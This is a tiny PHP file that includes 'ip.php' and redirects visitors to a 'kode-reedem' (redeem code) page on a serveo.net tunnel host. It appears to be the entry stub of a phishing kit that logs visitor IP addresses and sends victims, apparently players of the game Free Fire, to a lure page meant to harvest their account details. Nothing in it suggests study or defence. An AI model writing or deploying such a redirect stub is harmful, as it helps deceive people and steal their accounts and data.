<?php
include 'ip.php';
header('Location: https://ffgarena.serveo.net/kode-reedem.html');
exit
?>
